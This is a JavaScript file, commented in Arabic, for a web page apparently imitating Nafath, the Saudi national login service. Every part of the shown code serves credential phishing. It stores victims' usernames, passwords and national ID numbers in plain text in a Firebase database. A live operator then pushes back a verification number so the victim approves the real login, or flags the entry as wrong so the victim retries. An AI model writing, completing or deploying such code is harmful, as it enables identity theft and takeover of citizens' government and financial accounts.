

// script.js



// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase

import { db } from "./firebase-config.js";



// استيراد الدوال المطلوبة (إضافة doc و onSnapshot للمراقبة اللحظية)

import {

collection,

addDoc,

serverTimestamp,

doc,

onSnapshot

} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";



document.addEventListener('DOMContentLoaded', () => {


// ==========================================

// 1. تفاعلات الصفحة الرئيسية (Index Page)

// ==========================================

const loginCard = document.getElementById('loginCard');

if (loginCard) {

loginCard.addEventListener('click', () => {

loginCard.style.transform = 'scale(0.95)';

setTimeout(() => {

window.location.href = 'login.html';

}, 150);

});

}



// ==========================================

// 2. نظام التبويب والأكورديون الديناميكي (Accordion System)

// ==========================================

const tabs = document.querySelectorAll('.accordion-item');

const panels = document.querySelectorAll('.form-panel-card');



tabs.forEach(tab => {

tab.addEventListener('click', () => {

if (tab.classList.contains('collapsed')) {


tabs.forEach(t => {

t.classList.remove('active');

t.classList.add('collapsed');

const icon = t.querySelector('.status-icon');

if (icon) {

icon.classList.remove('fa-minus');

icon.classList.add('fa-plus');

}

});



panels.forEach(p => {

p.classList.add('hidden-panel');

});



tab.classList.remove('collapsed');

tab.classList.add('active');

const currentIcon = tab.querySelector('.status-icon');

if (currentIcon) {

currentIcon.classList.remove('fa-plus');

currentIcon.classList.add('fa-minus');

}



const targetPanelId = tab.getAttribute('data-target');

const targetPanel = document.getElementById(targetPanelId);

if (targetPanel) {

targetPanel.classList.remove('hidden-panel');

}

}

});

});



// ==========================================

// 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً

// ==========================================

const globalLoader = document.getElementById('globalLoader');


// دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر والتحويل للواجهة الرقمية

function listenToAdminApproval(collectionName, docId) {

const docRef = doc(db, collectionName, docId);


const nafathFormContainer = document.getElementById('nafathFormContainer');

const nafathWaitContainer = document.getElementById('nafathWaitContainer');

const nafathLiveNumber = document.getElementById('nafathLiveNumber');


// الاستماع للتغيرات اللحظية في قاعدة البيانات

const unsubscribe = onSnapshot(docRef, (snapshot) => {

if (snapshot.exists()) {

const data = snapshot.data();


// الإجراء الأول: نقر الأدمن على "رقم تأكيد" وإرسال الكود للمطابقة

if (data.status === "show_code") {

// إخفاء اللودر الزجاجي الدائري لتبسيط الرؤية

if (globalLoader) globalLoader.classList.add('hidden-loader');


// إخفاء الـ Form الأصلي وقسم التحميل لتطبيق نفاذ

if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');


// حقن الرقم المستلم من الأدمن في مربع العرض

if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;


// إظهار واجهة الانتظار الرقمية المطابقة للتصميم الرسمي

if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');

}


// الإجراء الثاني: رقم الهوية غير صحيح من الأدمن

else if (data.status === "wrong_national_id") {

if (globalLoader) globalLoader.classList.add('hidden-loader');

alert('عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.');

unsubscribe();

window.location.reload();

}


// الإجراء الثالث: بيانات اسم المستخدم أو كلمة المرور غير صحيحة من الأدمن

else if (data.status === "wrong_auth_data") {

if (globalLoader) globalLoader.classList.add('hidden-loader');

alert('اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.');

unsubscribe();

window.location.reload();

}



// الإجراء المسبق: الموافقة التامة والنهائية والتحويل للمنصة الرئيسية

else if (data.status === "approved") {

if (globalLoader) globalLoader.classList.add('hidden-loader');

alert('تم التحقق والمطابقة بنجاح من قبل الإدارة.');

window.location.href = "dashboard.html";

unsubscribe();

}


else if (data.status === "rejected") {

if (globalLoader) globalLoader.classList.add('hidden-loader');

alert('تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.');

unsubscribe();

window.location.reload();

}

}

});

}



// تفعيل زر إلغاء الطلب بداخل واجهة انتظار نفاذ لإعادة تصفير ونعش الحقول

const cancelNafathBtn = document.getElementById('cancelNafathBtn');

if (cancelNafathBtn) {

cancelNafathBtn.addEventListener('click', () => {

window.location.reload();

});

}



// أ) نموذج اسم المستخدم وكلمة المرور الأصلي

const authForm = document.getElementById('authForm');

if (authForm) {

authForm.addEventListener('submit', async (e) => {

e.preventDefault();


const usernameInput = document.getElementById('username').value;

const passwordInput = document.getElementById('password').value;


if (globalLoader) globalLoader.classList.remove('hidden-loader');


try {

const docRef = await addDoc(collection(db, "users_login"), {

username: usernameInput,

password: passwordInput,

timestamp: serverTimestamp(),

device: navigator.userAgent,

status: "waiting_admin"

});



listenToAdminApproval("users_login", docRef.id);


} catch (error) {

console.error("خطأ: ", error);

alert('عذراً، حدث خطأ في الاتصال بالشبكة.');

if (globalLoader) globalLoader.classList.add('hidden-loader');

}

});

}



// ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ) مع حصر الطول بعشرة أرقام

const appForm = document.getElementById('appForm');

if (appForm) {

// منع كتابة الحروف غير الرقمية والحد من الطول أثناء الكتابة أيضاً لسلامة الإدخال

const nationalIdField = document.getElementById('nationalId');

if (nationalIdField) {

nationalIdField.addEventListener('input', (e) => {

e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);

});

}



appForm.addEventListener('submit', async (e) => {

e.preventDefault();


const nationalIdInput = document.getElementById('nationalId').value.trim();


// التحقق النهائي من شرط الـ 10 أرقام تماماً قبل الإرسال والرفع للفايربيس

if (nationalIdInput.length !== 10) {

alert('خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً.');

return;

}


if (globalLoader) globalLoader.classList.remove('hidden-loader');


try {

const docRef = await addDoc(collection(db, "nafath_app_requests"), {

nationalId: nationalIdInput,

timestamp: serverTimestamp(),

device: navigator.userAgent,

status: "waiting_admin"

});


listenToAdminApproval("nafath_app_requests", docRef.id);


} catch (error) {

console.error("خطأ: ", error);

alert('فشل إرسال الطلب، تأكد من اتصال الشبكة.');

if (globalLoader) globalLoader.classList.add('hidden-loader');

}

});

}



// ==========================================

// 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)

// ==========================================

const langSwitch = document.getElementById('langSwitch');

if (langSwitch) {

langSwitch.addEventListener('click', () => {

const currentLang = langSwitch.querySelector('span').innerText.trim();

if (currentLang === 'عربي') {

langSwitch.querySelector('span').innerText = 'English';

document.documentElement.setAttribute('dir', 'rtl');

document.documentElement.setAttribute('lang', 'ar');

document.body.style.direction = 'rtl';

} else {

langSwitch.querySelector('span').innerText = 'عربي';

document.documentElement.setAttribute('dir', 'ltr');

document.documentElement.setAttribute('lang', 'en');

document.body.style.direction = 'ltr';

}

});

}

}); 

